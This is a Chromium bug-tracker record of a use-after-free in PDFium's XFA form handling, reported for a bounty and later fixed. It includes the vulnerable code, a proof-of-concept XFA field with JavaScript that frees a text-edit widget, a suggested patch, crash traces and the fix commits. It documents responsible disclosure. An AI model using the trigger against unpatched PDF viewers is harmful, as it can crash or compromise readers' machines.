# Security: PDFium (XFA) Use-after-free in CXFA_FFTextEdit::OnProcessEvent

| Field | Value |
|-------|-------|
| **Issue ID** | [40095651](https://issues.chromium.org/issues/40095651) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2019-07-09 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

CXFA\_FFNumericEdit object use-after-free in function CXFA\_FFTextEdit::OnProcessEvent

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in chrome.exe

DETAIL INFORMATION

The bug is in function |CXFA\_FFTextEdit::OnProcessEvent|

```
void CXFA_FFTextEdit::OnProcessEvent(CFWL_Event\* pEvent) {  
  CXFA_FFField::OnProcessEvent(pEvent);  
  switch (pEvent->GetType()) {  
    case CFWL_Event::Type::TextWillChange:  
      OnTextWillChange(m_pNormalWidget.get(),  
                       static_cast<CFWL_EventTextWillChange\*>(pEvent));  
      break;  
    case CFWL_Event::Type::TextFull:  
      OnTextFull(m_pNormalWidget.get());  
      break;  
    default:  
      break;  
  }  
  m_pOldDelegate->OnProcessEvent(pEvent);  
}  

```

If the `pEvent->GetType()` is equal `CFWL_Event::Type::TextWillChange` then the function `OnTextWillChange` is called

```
void CXFA_FFTextEdit::OnTextWillChange(CFWL_Widget\* pWidget,  
                                       CFWL_EventTextWillChange\* event) {  
  GetLayoutItem()->SetStatusBits(XFA_WidgetStatus_TextEditValueChanged);  
  
  CXFA_EventParam eParam;  
  eParam.m_eType = XFA_EVENT_Change;  
  eParam.m_wsChange = event->change_text;  
  eParam.m_pTarget = m_pNode.Get();  
  eParam.m_wsPrevText = event->previous_text;  
  eParam.m_iSelStart = static_cast<int32_t>(event->selection_start);  
  eParam.m_iSelEnd = static_cast<int32_t>(event->selection_end);  
  
  m_pNode->ProcessEvent(GetDocView(), XFA_AttributeValue::Change, &eParam);		==> We can call javascript function here!  
  ...  

```

We can see that in function `CXFA_FFTextEdit::OnTextWillChange`, there is a call to function `ProcessEvent`. This function will trigger the javascript function that assigned with event of field.  

For example, in function `OnTextWillChange`, the function `ProcessEvent` is call with parameter is `XFA_AttributeValue::Change` => the javascript function of `change` event of field is called. In javascript function, we can setup to delete the `CXFA_FFTextEdit` object. After that, back to `CXFA_FFTextEdit::OnProcessEvent`, the `CXFA_FFTextEdit` object is used again to access `m_pOldDelegate` property

To trigger this bug, I use `numericEdit` field and set an `initialize` event for this field. Here is xml string of this field

```
<field name="field2" h="10.625mm" w="30.625mm" x="1mm" y="1mm">  
    <ui>  
        <numericEdit>  
        </numericEdit>  
    </ui>  
    <caption>  
        <value>  
            <text>Employee</text>  
        </value>  
    </caption>  
    <event activity="initialize" name="event__initialize">  
        <script contentType="application/x-javascript">  
            field2.rawValue=2;  
        </script>  
    </event>  
	<event activity="change">  
		<script contentType="application/x-javascript">  
			f1 = xfa.resolveNode("xfa.form..field1");  
			xfa.host.setFocus(f1);  
			xfa.template.remerge();      
			xfa.host.openList(f1);  
		</script>  
	</event>  
</field>  

```

Javascript code of `initialize` event must has to get to function `CXFA_FFTextEdit::OnProcessEvent` with `CFWL_Event::Type::TextWillChange` event type.

After reaching to function `CXFA_FFTextEdit::OnProcessEvent`, to trigger JS code, i set script for event `change`. So when the function `OnTextWillChange` is called, the JS code of `change` event is executed. This code will trigger the free of `CXFA_FFTextEdit` object

PATCH

We can patch this by using ObservedPtrs to observe CXFA\_FFTextEdit across `change` event.

```
void CXFA_FFTextEdit::OnProcessEvent(CFWL_Event\* pEvent) {  
  // ProcessEvent may remove this widget.  
  ObservedPtr<CXFA_FFWidget> pWatched(this);  
    
  CXFA_FFField::OnProcessEvent(pEvent);  
  switch (pEvent->GetType()) {  
    case CFWL_Event::Type::TextWillChange:  
      OnTextWillChange(m_pNormalWidget.get(),  
                       static_cast<CFWL_EventTextWillChange\*>(pEvent));  
      break;  
    case CFWL_Event::Type::TextFull:  
      OnTextFull(m_pNormalWidget.get());  
      break;  
    default:  
      break;  
  }  
    
  if (!pWatched)  
    return;  
    
  m_pOldDelegate->OnProcessEvent(pEvent);  
}  

```

And maybe all `OnProcessEvent` function of all derived class of `CXFA_FFWidget` (like `CXFA_FFListBox`, `CXFA_FFPushButton`, ...) should add this observing too.

CRASH INFORMATION

```
(2c44.1ca4): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\pdfium.dll  
eax=3888aff8 ebx=0093c544 ecx=3888aff8 edx=0093c454 esi=0093c454 edi=0093c348  
eip=5337cfca esp=0093c33c ebp=0093c340 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
pdfium!fxcrt::UnownedPtr::operator->+0xa:  
5337cfca 8b00            mov     eax,dword ptr [eax]  ds:002b:3888aff8=????????  
  
2:021> kp  
 # ChildEBP RetAddr    
00 0093c340 533afdea pdfium!fxcrt::UnownedPtr<IFWL_WidgetDelegate>::operator->(void)+0xa [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fxcrt\unowned_ptr.h @ 102]   
01 0093c374 533a0026 pdfium!CXFA_FFTextEdit::OnProcessEvent(class CFWL_Event \* pEvent = 0x0093c454)+0xba [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_fftextedit.cpp @ 352]   
02 0093c3a0 537c2a69 pdfium!CXFA_FFNumericEdit::OnProcessEvent(class CFWL_Event \* pEvent = 0x0093c454)+0x86 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffnumericedit.cpp @ 76]   
03 0093c3d4 537d24cd pdfium!CFWL_EventTarget::ProcessEvent(class CFWL_Event \* pEvent = 0x0093c454)+0xa9 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_eventtarget.cpp @ 29]   
04 0093c404 537db172 pdfium!CFWL_NoteDriver::SendEvent(class CFWL_Event \* pNote = 0x0093c454)+0xad [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_notedriver.cpp @ 33]   
05 0093c420 537bde35 pdfium!CFWL_Widget::DispatchEvent(class CFWL_Event \* pEvent = 0x0093c454)+0x62 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_widget.cpp @ 305]   
06 0093c484 537f0cc9 pdfium!CFWL_Edit::OnTextWillChange(struct CFDE_TextEditEngine::TextChange \* change = 0x0093c530)+0xa5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_edit.cpp @ 305]   
07 0093c558 537bd00d pdfium!CFDE_TextEditEngine::Insert(unsigned int idx = 0, class fxcrt::WideString \* request_text = 0x0093c5cc, CFDE_TextEditEngine::RecordOperation add_operation = kInsertRecord (0n0))+0x139 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fde\cfde_texteditengine.cpp @ 286]   
08 0093c57c 5339fbce pdfium!CFWL_Edit::SetText(class fxcrt::WideString \* wsText = 0x0093c5cc)+0x4d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_edit.cpp @ 168]   
09 0093c5e4 53389922 pdfium!CXFA_FFNumericEdit::LoadWidget(void)+0x19e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffnumericedit.cpp @ 40]   
0a 0093c640 53388895 pdfium!CXFA_FFDocView::SetFocus(class CXFA_FFWidget \* pNewFocus = 0x3888afa0)+0x172 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 296]   
0b 0093c664 533998de pdfium!CXFA_FFDocView::SetFocusNode(class CXFA_Node \* node = 0x38180f80)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 316]   
0c 0093c67c 53340c63 pdfium!CXFA_FFNotify::SetFocusWidgetNode(class CXFA_Node \* pNode = 0x38180f80)+0x3e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffnotify.cpp @ 302]   
0d 0093c730 5333eb3e pdfium!CJX_HostPseudoModel::setFocus(class CFX_V8 \* runtime = 0x24902f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0093c848 { size=1 })+0x373 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.cpp @ 462]   
0e 0093c768 5334e0f3 pdfium!CJX_HostPseudoModel::setFocus_static(class CJX_Object \* node = 0x39232fd8, class CFX_V8 \* runtime = 0x24902f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0093c848 { size=1 })+0x7e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.h @ 39]   
0f 0093c7c0 532f84dc pdfium!CJX_Object::RunMethod(class fxcrt::WideString \* func = 0x0093c994, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0093c848 { size=1 })+0x103 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_object.cpp @ 179]   
10 0093c868 532f2692 pdfium!CFXJSE_Engine::NormalMethodCall(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x0093ca00, class fxcrt::WideString \* functionName = 0x0093c994)+0x1fc [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 459]   
11 0093c9e4 598cd5f1 pdfium!`anonymous namespace'::DynPropGetterAdapter_MethodCallback(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x0093ca00)+0x382 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_class.cpp @ 111]   
12 0093ca58 598cc056 v8!v8::internal::FunctionCallbackArguments::Call(class v8::internal::CallHandlerInfo handler = class v8::internal::CallHandlerInfo)+0x251 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api-arguments-inl.h @ 158]   
13 0093cac4 598ca72f v8!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>(class v8::internal::Isolate \* isolate = <Value unavailable error>, class v8::internal::Handle<v8::internal::HeapObject> function = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::HeapObject> new_target = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::FunctionTemplateInfo> fun_data = class v8::internal::Handle<v8::internal::FunctionTemplateInfo>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments)+0x316 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 113]   
14 0093cb18 598ca2d2 v8!v8::internal::Builtin_Impl_HandleApiCall(class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments, class v8::internal::Isolate \* isolate = 0x3ce44b58)+0x18f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 141]   
15 0093cb90 5a655fc3 v8!v8::internal::Builtin_HandleApiCall(int args_length = 0n6, unsigned int \* args_object = 0x0093cbc8, class v8::internal::Isolate \* isolate = 0x3ce44b58)+0x72 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 129]   
16 0093cbac 5a447c1c v8!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x43  
17 0093cbec 5a43481c v8!Builtins_InterpreterEntryTrampoline+0x31c  
18 0093cc08 5a447c1c v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
19 0093cc50 5a43481c v8!Builtins_InterpreterEntryTrampoline+0x31c  
1a 0093cc6c 5a43ff3f v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
1b 0093cc84 5a43fd5b v8!Builtins_JSEntryTrampoline+0x5f  
1c 0093ccb0 59a03795 v8!Builtins_JSEntry+0x5b  
1d (Inline) -------- v8!v8::internal::GeneratedCode<unsigned int,unsigned int,unsigned int,unsigned int,unsigned int,int,unsigned int \*\*>::Call+0xf [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\simulator.h @ 138]   
1e 0093cd6c 59a02eae v8!v8::internal::`anonymous namespace'::Invoke(class v8::internal::Isolate \* isolate = <Value unavailable error>, struct v8::internal::`anonymous namespace'::InvokeParams \* params = 0x0093cd78)+0x8d5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 264]   
1f 0093cdb0 598253d5 v8!v8::internal::Execution::Call(class v8::internal::Isolate \* isolate = 0x3ce44b58, class v8::internal::Handle<v8::internal::Object> callable = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, int argc = 0n1, class v8::internal::Handle<v8::internal::Object> \* argv = 0x0093d17c)+0x6e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 356]   
20 0093ce68 532f4df0 v8!v8::Function::Call(class v8::Local<v8::Context> context = class v8::Local<v8::Context>, class v8::Local<v8::Value> recv = class v8::Local<v8::Value>, int argc = 0n1, class v8::Local<v8::Value> \* argv = 0x0093d17c)+0x2f5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api.cc @ 4793]   
21 0093d190 532fa199 pdfium!CFXJSE_Context::ExecuteScript(char \* szScript = 0x3e29010c ".    f2 = xfa.resolveNode("xfa.form..field2");.    xfa.host.setFocus(f2);.", class CFXJSE_Value \* lpRetValue = 0x3ce89ff0, class CFXJSE_Value \* lpNewThisObject = 0x3ce7dff0)+0x9b0   
  
...  
  

```

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 9.5 KB)
- [log_crash.txt](attachments/log_crash.txt) (text/plain, 31.1 KB)

## Timeline

### pa...@chromium.org (2019-07-09)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>PDF]

### pa...@chromium.org (2019-07-09)

[Empty comment from Monorail migration]

### hu...@gmail.com (2020-01-14)

Hi all, 

It seems that a patch (https://pdfium-review.googlesource.com/c/pdfium/+/63751) makes my poc can't trigger deletion of CXFA_FFTextEdit object cause it makes program crash in 

CFWL_Widget::~CFWL_Widget() {
  CHECK(!IsLocked());  // Prefer hard stop to UaF.
  NotifyDriver();
  m_pWidgetMgr->RemoveWidget(this);
}

(https://cs.chromium.org/chromium/src/third_party/pdfium/xfa/fwl/cfwl_widget.cpp?rcl=801b95f34349ff15e4e2650ae86beea2bda5eeef&l=47)

When CXFA_FFTextEdit object is free, CFWL_Widget object is also freed too but CFWL_Widget object is still locked in CXFA_FFTextEdit::LoadWidget() function

  {
    CFWL_Widget::ScopedUpdateLock update_lock(pFWLEdit);
    UpdateWidgetProperty();
    pFWLEdit->SetText(m_pNode->GetValue(XFA_VALUEPICTURE_Display));
  }

(https://cs.chromium.org/chromium/src/third_party/pdfium/xfa/fxfa/cxfa_fftextedit.cpp?rcl=801b95f34349ff15e4e2650ae86beea2bda5eeef&l=58)

=> program is crashed with the CHECK() 


But the bug is still exist and I gonna try to make another poc to trigger this bug again!

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-20)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f

commit 612bb79ee594c470916503c176a60500efd3689f
Author: Lei Zhang <thestig@chromium.org>
Date: Thu Feb 20 18:54:02 2020

Retain corresponding layoutitem in CXFA_FFWidget::LoadWidget().

Prevent destruction of |this| in CXFA_FFWidget::LoadWidget() and all of
its overrides.

Turns the bug in question from a last line of defense CHECK() failure to
an ObserverPtr nullptr dereference, due to unexpected object
destruction while observing it.

Bug: chromium:982193
Change-Id: I796905fc0b8bcb57d85b4a7c71c5836fb56f6911
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/66750
Reviewed-by: Tom Sepez <tsepez@chromium.org>
Commit-Queue: Lei Zhang <thestig@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_fflistbox.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_fffield.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffbarcode.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffcheckbutton.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffwidget.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffsignature.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffimage.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffnumericedit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_fftextedit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffdatetimeedit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffcombobox.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffpushbutton.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffpasswordedit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/612bb79ee594c470916503c176a60500efd3689f/xfa/fxfa/cxfa_ffimageedit.cpp


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-20)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/ce0e2ecbf82b65c93ff49935d6dbcc2d7183e10e

commit ce0e2ecbf82b65c93ff49935d6dbcc2d7183e10e
Author: Lei Zhang <thestig@chromium.org>
Date: Thu Feb 20 18:57:03 2020

Retain corresponding layoutitem in CXFA_FFDocView::SetFocus().

Prevent destruction of the newly focused widget. Remove the need for an
ObserverPtr, and potential nullptr dereference with the ObserverPtr.

Bug: chromium:982193
Change-Id: I1e210c91ab90f90a6d3fc7de9d83dd1427e97f0d
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/66713
Reviewed-by: Tom Sepez <tsepez@chromium.org>
Commit-Queue: Lei Zhang <thestig@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/ce0e2ecbf82b65c93ff49935d6dbcc2d7183e10e/xfa/fxfa/cxfa_ffdocview.cpp


### th...@chromium.org (2020-02-20)

re: https://crbug.com/chromium/982193#c3 - Looking forward to the next bug report. Sorry this one took so long to fix.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/bcc5042ff0d94a421a2cd5186989445e54e35255

commit bcc5042ff0d94a421a2cd5186989445e54e35255
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Feb 20 21:35:26 2020

Roll src/third_party/pdfium c80274e041d6..adfb1574077d (13 commits)

https://pdfium.googlesource.com/pdfium.git/+log/c80274e041d6..adfb1574077d

git log c80274e041d6..adfb1574077d --date=short --first-parent --format='%ad %ae %s'
2020-02-20 nigi@chromium.org Roll third_party/icu/ dbd3825b3..9f4020916 (1 commit)
2020-02-20 nigi@chromium.org Roll tools/clang/ f2e1fa017..81bf7cada (1 commit)
2020-02-20 nigi@chromium.org Roll build/ 1bee638a8..d4d44f882 (14 commits; 1 trivial rolls)
2020-02-20 nigi@chromium.org Roll tools/clang/ 42fbdfef1..f2e1fa017 (5 commits)
2020-02-20 thestig@chromium.org Retain corresponding layoutitem in CXFA_FFDocView::SetFocus().
2020-02-20 nigi@chromium.org Roll base/trace_event/common/ 618bcf7a2..dab187b37 (3 commits)
2020-02-20 thestig@chromium.org Retain corresponding layoutitem in CXFA_FFWidget::LoadWidget().
2020-02-20 tsepez@chromium.org Initialize CFX_BreakPiece members in header.
2020-02-20 tsepez@chromium.org CFX_TxtBreak::EndBreak_SplitLine() always returns false.
2020-02-20 thestig@chromium.org Improve comments in public/fpdf_transformpage.h.
2020-02-20 tsepez@chromium.org Always retain corresponding layoutitem in CXFA_FF*::On*() methods
2020-02-20 nigi@chromium.org Roll v8/ cd3414532..07a0ee92d (540 commits)
2020-02-20 nigi@chromium.org Roll base/trace_event/common/ 81c050f85..618bcf7a2 (3 commits)

Created with:
  gclient setdep -r src/third_party/pdfium@adfb1574077d

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/pdfium-autoroll
Please CC pdfium-deps-rolls@chromium.org on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

Bug: chromium:982193
Tbr: pdfium-deps-rolls@chromium.org
Change-Id: Ie64d776fe446722d73b9a39a94d9d1495ff1d237
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2067528
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#743260}

[modify] https://crrev.com/bcc5042ff0d94a421a2cd5186989445e54e35255/DEPS


### [Deleted User] (2020-02-21)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-24)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-02-27)

Congrats the Panel decided to award $5,000 for this report!

### na...@google.com (2020-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-29)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-05-29)

This issue was migrated from crbug.com/chromium/982193?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095651)*
